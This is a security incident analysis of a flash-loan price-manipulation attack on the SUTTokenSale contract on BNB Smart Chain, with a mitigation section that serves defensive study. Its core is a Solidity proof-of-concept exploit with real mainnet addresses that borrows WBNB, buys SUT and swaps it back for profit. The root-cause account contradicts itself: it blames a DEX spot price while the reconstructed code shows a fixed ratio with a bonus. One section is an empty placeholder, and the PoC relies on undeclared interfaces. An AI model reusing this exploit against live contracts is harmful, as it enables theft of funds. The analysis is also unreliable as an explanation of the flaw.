# SUT Flash Loan Price Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | SUT (SUTTokenSale) |
| Date | 2023-07-19 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$8,000 USD |
| Attack Type | Flash Loan + Token Sale Price Manipulation |
| CWE | CWE-682 (Incorrect Calculation) |
| Attacker Address | `0x547fb3db0f13eed5d3ff930a0b61ae35b173b4b5` |
| Attack Contract | `0x9be508ce41ae5795e1ebc247101c40da7d5742db` |
| Vulnerable Contract | `0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37` (SUTTokenSale) |
| Attack TX | `0xfa1ece5381b9e2b2b83cb10faefde7632ca411bb38dd6bafe1f1140b1360f6ae` |
| Fork Block | 30,165,901 |

## 2. Vulnerability Code Analysis

The SUTTokenSale contract calculated the sale price of SUT tokens based on the DEX spot price. By acquiring WBNB via a flash loan and converting it to BNB to manipulate the token sale price, an attacker could purchase large quantities of SUT tokens at a price below their actual value.

```solidity
// Vulnerable pattern: SUT token price manipulation via BNB deposit
contract SUTTokenSale {
    uint256 public sutPerBNB;  // Vulnerable: dynamically calculated ratio

    function buyTokens() external payable {
        // Vulnerable: dynamic ratio calculation based on msg.value (BNB)
        // Ratio can be manipulated by depositing large amounts of BNB
        uint256 sutAmount = msg.value * sutPerBNB / 1e18;

        // More favorable ratio applied for larger BNB deposits
        if (msg.value >= 10 ether) {
            sutAmount = sutAmount * 110 / 100;  // 10% bonus
        }

        SUT.transfer(msg.sender, sutAmount);
    }
}
```

**Vulnerability**: The price ratio in the sale contract was designed to become more favorable based on the amount of BNB deposited, making it possible to acquire excessive SUT tokens by securing large amounts of BNB via a flash loan.

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Flash loan + token sale price manipulation
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
Attacker [0x547fb3db0f13eed5d3ff930a0b61ae35b173b4b5]
  │
  ├─1─▶ DPPOracle.flashLoan(10 WBNB) [0xFeAFe253802b77456B4627F8c2306a9CeBb5d681]
  │
  ├─2─▶ WBNB → BNB unwrap
  │      [IWBNB.withdraw(10 ether)]
  │
  ├─3─▶ SUTTokenSale price manipulation analysis
  │      Confirmed ability to bulk-purchase SUT tokens at manipulated price
  │
  ├─4─▶ SUTTokenSale.buyTokens{value: 10 BNB}() call
  │      [SUTTokenSale: 0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37]
  │      → Received excessive SUT tokens at manipulated ratio
  │
  ├─5─▶ UniswapV3Router.exactInputSingle()
  │      [Router: 0x13f4EA83D0bd40E75C8222255bc855a974568Dd4]
  │      SUT → WBNB reverse swap
  │      [SUT: 0x70E1bc7E53EAa96B74Fad1696C29459829509bE2]
  │
  └─6─▶ DPP Oracle flash loan repayment + ~$8K USD profit realized
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface ISUTTokenSale {
    function buyTokens() external payable;
}

interface IWBNB is IERC20 {
    function withdraw(uint256 amount) external;
    function deposit() external payable;
}

contract SUTExploit {
    IWBNB WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 SUT = IERC20(0x70E1bc7E53EAa96B74Fad1696C29459829509bE2);
    ISUTTokenSale sutSale = ISUTTokenSale(0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37);
    IDPPOracle dppOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IUniswapV3Router uniRouter = IUniswapV3Router(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);

    function testExploit() external {
        dppOracle.flashLoan(10e18, 0, address(this), "exploit");
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // WBNB → BNB
        WBNB.withdraw(baseAmount);

        // Purchase SUT at manipulated price
        sutSale.buyTokens{value: address(this).balance}();

        // SUT → WBNB swap
        uint256 sutBalance = SUT.balanceOf(address(this));
        SUT.approve(address(uniRouter), sutBalance);
        uniRouter.exactInputSingle(ISwapRouter.ExactInputSingleParams({
            tokenIn: address(SUT),
            tokenOut: address(WBNB),
            fee: 3000,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: sutBalance,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        }));

        // Repay flash loan
        WBNB.transfer(address(dppOracle), baseAmount);
    }

    receive() external payable {}
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-682 (Incorrect Calculation) |
| Vulnerability Type | Token sale price manipulation, flash loan abuse |
| Impact Scope | SUT balance in the SUTTokenSale contract |
| Explorer | [BSCscan](https://bscscan.com/address/0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37) |

## 6. Security Recommendations

```solidity
// Fix 1: Use a fixed price or Chainlink oracle
contract SUTTokenSale {
    AggregatorV3Interface public bnbPriceFeed;
    uint256 public constant SUT_USD_PRICE = 1e16; // $0.01 per SUT

    function buyTokens() external payable {
        // Use Chainlink BNB/USD price
        (, int256 bnbPrice,,,) = bnbPriceFeed.latestRoundData();
        uint256 usdValue = msg.value * uint256(bnbPrice) / 1e8;
        uint256 sutAmount = usdValue * 1e18 / SUT_USD_PRICE;

        require(sutAmount <= SUT.balanceOf(address(this)), "Insufficient SUT");
        SUT.transfer(msg.sender, sutAmount);
    }
}

// Fix 2: Enforce a purchase cap
uint256 public constant MAX_BNB_PER_TX = 1 ether;  // Max 1 BNB per transaction

function buyTokens() external payable {
    require(msg.value <= MAX_BNB_PER_TX, "Exceeds per-tx limit");
    // ...
}

// Fix 3: Prevent repeated purchases within the same block
mapping(address => uint256) public lastPurchaseBlock;

function buyTokens() external payable {
    require(block.number > lastPurchaseBlock[msg.sender], "One purchase per block");
    lastPurchaseBlock[msg.sender] = block.number;
    // ...
}
```

## 7. Lessons Learned

1. **Token Sale Price Design**: The price in ICO/token sale contracts must be set using a manipulation-resistant external oracle (e.g., Chainlink) or a fixed price.
2. **Deposit-Proportional Bonus Risk**: Bonus structures proportional to deposit size are vulnerable to attacks where an adversary temporarily deposits a large amount via a flash loan to claim the maximum bonus.
3. **Small Project Vulnerability**: Although the loss here was a modest $8,000, the same vulnerability pattern applied to a large-scale ICO could result in tens of millions of dollars in damages.
4. **WBNB/BNB Conversion Pattern**: The pattern of converting WBNB to BNB is commonly used in flash loan attacks. Any `payable` function that accepts BNB must account for this pattern.